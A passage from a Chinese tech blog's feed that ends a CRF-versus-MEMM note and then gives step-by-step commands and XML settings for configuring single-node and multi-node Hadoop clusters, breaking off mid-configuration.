id="对比memm">对比MEMM</span></h2><p>虽然CRF在MEMM的基础上，建立隐变量X的概率无向图解决了MEMM的局部归一化问题。但是，并不是说MEMM的结果就一定崩塌。</p><p>MEMM的一个明显的特点是实现简单、速度快，因为它只需要每一步单独执行softmax，所以MEMM是完全可以并行的，速度跟直接逐步Softmax基本一样。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/CRF--SimpleNote_pic/image-20201118161937684.png" srcset="/img/loading.gif" lazyload></p><p>它的每一步计算，不需要整个序列的信息计算分母，而是依赖于上一步的状态。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nlp </tag>
            
            <tag> CRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hadoop+spark环境配置</title>
      <link href="/posts/858c7a63.html"/>
      <url>/posts/858c7a63.html</url>
      
        <content type="html"><![CDATA[<h3><span id="单节点hadoop">单节点Hadoop</span></h3><h4><span id="1安装jdk"><strong>1.安装JDK</strong></span></h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">sudo apt-get <span class="hljs-keyword">update</span><br><br>sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> <span class="hljs-keyword">default</span>-jdk<br><br><span class="hljs-keyword">java</span> -<span class="hljs-keyword">version</span><br></code></pre></div></td></tr></table></figure><p>查看安装路径</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span>-alternatives <span class="hljs-comment">--display java</span><br></code></pre></div></td></tr></table></figure><h4><span id="2设定-ssh无密码登入"><strong>2.设定 SSH无密码登入</strong></span></h4><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install ssh<br><br>sudo apt-<span class="hljs-builtin-name">get</span> install rsync<br><br>ssh-keygen -t dsa -P <span class="hljs-string">''</span> -f ~/.ssh/id_dsa<br>ll ~/.ssh<br></code></pre></div></td></tr></table></figure><p>为了无密码登录本机，加入公匙到许可证文件</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">cat ~<span class="hljs-regexp">/.ssh/i</span>d_dsa.pub &gt;&gt; ~<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></div></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">systemctl</span> <span class="hljs-selector-tag">restart</span> <span class="hljs-selector-tag">sshd</span><span class="hljs-selector-class">.service</span><br></code></pre></div></td></tr></table></figure><h4><span id="3下载安装hadoop"><strong>3.下载安装Hadoop</strong></span></h4><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">wget https:<span class="hljs-comment">//www.apache.org/dyn/closer.cgi/hadoop/common/hadoop-2.9.2/hadoop-2.9.2.tar.gz</span><br><br>sudo tar -zxvf hadoop<span class="hljs-number">-2.9</span><span class="hljs-number">.2</span>.tar.gz<br><br>sudo mv hadoop<span class="hljs-number">-2.9</span><span class="hljs-number">.2</span> /usr/local/hadoop<br><br>ll /usr/local/hadoop<br></code></pre></div></td></tr></table></figure><h4><span id="4设定hadoop环境变数"><strong>4.设定Hadoop环境变数</strong></span></h4><p>修改~/.bashrc</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sudo gedit ~<span class="hljs-string">/.bashrc</span><br></code></pre></div></td></tr></table></figure><p>输入下列内容</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">JAVA_HOME</span>=/usr/lib/jvm/java-8-openjdk-amd64<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_HOME</span>=/usr/local/hadoop<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$HADOOP_HOME/bin<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:$HADOOP_HOME/sbin<br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_MAPRED_HOME</span>=<span class="hljs-variable">$HADOOP_HOME</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_COMMON_HOME</span>=<span class="hljs-variable">$HADOOP_HOME</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_HDFS_HOME</span>=<span class="hljs-variable">$HADOOP_HOME</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">YARN_HOME</span>=<span class="hljs-variable">$HADOOP_HOME</span><br><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_COMMON_LIB_NATIVE_DIR</span>=<span class="hljs-variable">$HADOOP_HOME</span>/lib/native<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HADOOP_OPTS</span>=<span class="hljs-string">"-Djava.library.path=<span class="hljs-variable">$HADOOP_HOME</span>/lib"</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">JAVA_LIBRARY_PATH</span>=<span class="hljs-variable">$HADOOP_HOME</span>/lib/native:$JAVA_LIBRARY_PATH<br></code></pre></div></td></tr></table></figure><p>让~/.bashrc修改生效</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></div></td></tr></table></figure><h4><span id="5修改hadoop组态设定档"><strong>5.修改Hadoop组态设定档</strong></span></h4><p>Step1 修改hadoop-env.sh配置文件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>hadoop-env.sh<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">JAVA_HOME</span>=/usr/lib/jvm/java-8-openjdk-amd64<br></code></pre></div></td></tr></table></figure><p>Step2 修改core-site.xml，设置HDFS名称</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>core-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>fs.default.name<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>hdfs://localhost:9000<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Step3 修改yarn-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/y</span>arn-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>mapreduce_shuffle<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.nodemanager.aux-services.mapreduce.shuffle.class<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>org.apache.hadoop.mapred.ShuffleHandler<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Step4 修改mapred-site.xml，监控Map和reduce程序的JobTracker</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo cp <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/m</span>apred-site.xml.template <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/m</span>apred-site.xml<br></code></pre></div></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/m</span>apred-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapreduce.framework.name<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>yarn<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Step5 修改hdfs-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>hdfs-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:dfs.replication设置blocks在其他节点的备份数量</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.replication<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span><span class="hljs-number">3</span><span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.namenode.name.dir<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span>file:<span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>namenode<span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br><span class="hljs-params">&lt;property&gt;</span><br><span class="hljs-params">&lt;name&gt;</span>dfs.datanode.data.dir<span class="hljs-params">&lt;/name&gt;</span> <br><span class="hljs-params">&lt;value&gt;</span>file:<span class="hljs-meta-keyword">/usr/</span>local<span class="hljs-meta-keyword">/hadoop/</span>hadoop_data<span class="hljs-meta-keyword">/hdfs/</span>datanode<span class="hljs-params">&lt;/value&gt;</span> <br><span class="hljs-params">&lt;/property&gt;</span><br><span class="hljs-params">&lt;property&gt;</span><br>  <span class="hljs-params">&lt;name&gt;</span>dfs.http.address<span class="hljs-params">&lt;/name&gt;</span><br>  <span class="hljs-params">&lt;value&gt;</span><span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">50070</span><span class="hljs-params">&lt;/value&gt;</span><br><span class="hljs-params">&lt;/property&gt;</span><br></code></pre></div></td></tr></table></figure><h4><span id="6建立与格式化hdfs目录"><strong>6.建立与格式化HDFS目录</strong></span></h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo mkdir -p <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>hadoop_data<span class="hljs-regexp">/hdfs/</span>namenode<br></code></pre></div></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo mkdir -p <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>hadoop_data<span class="hljs-regexp">/hdfs/</span>datanode<br></code></pre></div></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">sudo chown <span class="hljs-string">ray:</span>ray -R <span class="hljs-regexp">/usr/</span>local/hadoop<br></code></pre></div></td></tr></table></figure><p>chown要根据当前用户名进行修改</p><p>格式化</p><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">hadoop namenode -<span class="hljs-built_in">format</span><br></code></pre></div></td></tr></table></figure><h4><span id="7启动hadoop"><strong>7.启动Hadoop</strong></span></h4><p>启动start-dfs.sh，再启动 start-yarn.sh</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-literal">start</span>-dfs.sh<br><br><span class="hljs-literal">start</span>-yarn.sh<br></code></pre></div></td></tr></table></figure><p>或 启动全部</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">start</span>-<span class="hljs-keyword">all</span>.sh<br></code></pre></div></td></tr></table></figure><p>查看目前所执行的行程</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">jps</span><br></code></pre></div></td></tr></table></figure><p>stop-dfs.sh</p><p>stop-yarn.sh</p><p>stop-all.sh</p><h4><span id="8开启hadoopresourcemanagerweb接口"><strong>8.开启HadoopResource­ManagerWeb接口</strong></span></h4><p>Hadoop Resource­Manager Web接口网址 http://localhost:8088/</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/hadoop-spark环境配置_pic/image-20201029171626529.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="9namenode-hdfsweb接口"><strong>9.NameNode HDFSWeb接口</strong></span></h4><p>开启HDFS Web UI网址 http://localhost:50070/</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/hadoop-spark环境配置_pic/image-20201029172711979.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="多节点hadoop">多节点Hadoop</span></h3><ul><li>由多台电脑组成:有一台主要的电脑master，在HDFS担任NameNode角色，在MapReduce2(YARN)担任ResourceManager角色</li><li>有多台的电脑data1、data2、data3，在HDFS担任DataNode角色，在MapReduce2(YARN)担任NodeManager角色</li></ul><p>Hadoop Multi NodeCluster规划，整理如下表格:</p><table><thead><tr class="header"><th><strong>伺服器名称</strong></th><th><strong>IP</strong></th><th><strong>HDFS</strong></th><th><strong>YARN</strong></th></tr></thead><tbody><tr class="odd"><td><strong>master</strong></td><td>192.168.0.100</td><td>NameNode</td><td>ResourceManager</td></tr><tr class="even"><td>data1</td><td>192.168.0.101</td><td>DataNode</td><td>NodeManager</td></tr><tr class="odd"><td>data2</td><td>192.168.0.102</td><td>DataNode</td><td>NodeManager</td></tr><tr class="even"><td>data3</td><td>192.168.0.103</td><td>DataNode</td><td>NodeManager</td></tr></tbody></table><h4><span id="1复制single-nodecluster到data1">1复制Single NodeCluster到data1</span></h4><p>将之前所建立的Single Node Cluster VirtualBoxhadoop虚拟机器复制到data1</p><h4><span id="2设定data1伺服器">2设定data1伺服器</span></h4><p>编辑网路设定档设定固定IP</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">sudo gedit /etc/network/<span class="hljs-built_in">int</span>erfaces<br></code></pre></div></td></tr></table></figure><p>输入下列内容 :</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"># <span class="hljs-built_in">int</span>erfaces(<span class="hljs-number">5</span>) file used by ifup(<span class="hljs-number">8</span>) <span class="hljs-keyword">and</span> ifdown(<span class="hljs-number">8</span>)<br><br><span class="hljs-built_in">auto</span> lo<br>iface lo inet loopback<br><br><span class="hljs-built_in">auto</span> eth0<br>iface eth0 inet static<br>address <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.101</span><br>netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>network <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>gateway <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>dns-nameservers <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></div></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">sudo vim /etc/NetworkManager/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NetworkManager</span>.</span></span>conf<br></code></pre></div></td></tr></table></figure><p>将<code>managed=false</code>修改成<code>managed=true</code></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> service </span>network-manager restart<br></code></pre></div></td></tr></table></figure><p>重启</p><p>设定hostname</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/</span>hostname<br></code></pre></div></td></tr></table></figure><p>输入下列内容:</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">data</span>1<br></code></pre></div></td></tr></table></figure><p>设定hosts档案</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></div></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> localhost<br><span class="hljs-number">127.0.1.1</span> hadoop<br><br><span class="hljs-number">192.168.0.100</span> master<br><span class="hljs-number">192.168.0.101</span> data1<br><span class="hljs-number">192.168.0.102</span> data2<br><span class="hljs-number">192.168.0.103</span> data3<br># The following lines are desirable for IPv6 capable hosts<br>::<span class="hljs-number">1</span> ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>ff00::<span class="hljs-number">0</span> ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span> ip6-allnodes<br>ff02::<span class="hljs-number">2</span> ip6-allrouters<br></code></pre></div></td></tr></table></figure><p>修改core-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/</span>core-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>fs.default.name<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>hdfs://master:9000<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>修改yarn-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop/y</span>arn-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>master:8025<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>master:8030<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.resourcemanager.address<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>master:8050<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>修改mapred-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/hadoop/</span>etc<span class="hljs-regexp">/hadoop /m</span>apred-site.xml<br></code></pre></div></td></tr></table></figure><p>在之间，输入下列内容:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapred.job.tracker<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>master:54311<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>修改hdfs-site.xml</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span 